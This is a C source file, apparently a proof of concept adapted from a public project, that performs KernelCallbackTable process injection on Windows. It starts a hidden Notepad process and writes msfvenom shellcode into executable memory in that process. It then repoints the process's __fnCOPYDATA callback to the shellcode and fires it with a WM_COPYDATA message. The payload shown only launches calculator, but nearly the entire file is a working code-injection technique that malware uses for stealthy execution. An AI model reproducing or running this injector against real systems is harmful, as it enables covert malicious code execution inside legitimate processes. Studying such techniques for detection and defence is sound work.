#include <Windows.H>
#include <stdio.h>
#include "struct.h"

/*
 * This code is based on the KernelCallbackTable-Injection project by capt-meelo
 * Source code available at: https://github.com/capt-meelo/KernelCallbackTable-Injection
 */

int main()
{
	// Shellcode that pops calc.exe
	// msfvenom -p windows/x64/exec CMD=calc.exe -f c
	unsigned char payload[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
	SIZE_T payloadSize = sizeof(payload);

	// Create a hidden sacrificial process (notepad.exe)
	PROCESS_INFORMATION pi;
	STARTUPINFO si = {sizeof(STARTUPINFO)};
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	CreateProcess(TEXT("C:\\Windows\\System32\\notepad.exe"), NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

	// Wait for the process to initialize
	WaitForInputIdle(pi.hProcess, 1000);

	// Locate the window associated with the Notepad process
	HWND hWindow = FindWindow(TEXT("Notepad"), NULL);
	printf("[+] Window Handle: 0x%p\n", hWindow);

	// Obtain the Process ID (PID)
	DWORD pid;
	GetWindowThreadProcessId(hWindow, &pid);
	printf("[+] Process ID: %d\n", pid);

	// Open the process with full access
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	printf("[+] Process Handle: 0x%p\n", hProcess);

	// Retrieve information about the process using NtQueryInformationProcess
	PROCESS_BASIC_INFORMATION pbi;
	pNtQueryInformationProcess myNtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtQueryInformationProcess");
	myNtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

	// Read the Process Environment Block (PEB)
	PEB peb;
	ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), NULL);
	printf("[+] PEB Address: 0x%p\n", pbi.PebBaseAddress);

	// Read the KernelCallBackTable (KCT) addresses
	KERNELCALLBACKTABLE kct;
	ReadProcessMemory(hProcess, peb.KernelCallbackTable, &kct, sizeof(kct), NULL);
	printf("[+] KernelCallbackTable Address: 0x%p\n", peb.KernelCallbackTable);

	// Write the payload to the remote process
	LPVOID payloadAddr = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(hProcess, payloadAddr, payload, payloadSize, NULL);
	printf("[+] Payload Address: 0x%p\n", payloadAddr);

	// Write the new callback table to the remote process
	LPVOID newKCTAddr = VirtualAllocEx(hProcess, NULL, sizeof(kct), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	kct.__fnCOPYDATA = (ULONG_PTR)payloadAddr;
	WriteProcessMemory(hProcess, newKCTAddr, &kct, sizeof(kct), NULL);
	printf("[+] __fnCOPYDATA: 0x%p\n", kct.__fnCOPYDATA);

	// Update the PEB's KernelCallbackTable address in the remote proces
	WriteProcessMemory(hProcess, (PBYTE)pbi.PebBaseAddress + offsetof(PEB, KernelCallbackTable), &newKCTAddr, sizeof(ULONG_PTR), NULL);
	printf("[+] Remote process PEB updated\n");

	// Trigger the execution of the payload via a WM_COPYDATA message
	COPYDATASTRUCT cds;
	WCHAR msg[] = TEXT("Triggered");
	cds.dwData = 1;
	cds.cbData = lstrlen(msg) * 2;
	cds.lpData = msg;
	SendMessage(hWindow, WM_COPYDATA, (WPARAM)hWindow, (LPARAM)&cds);
}
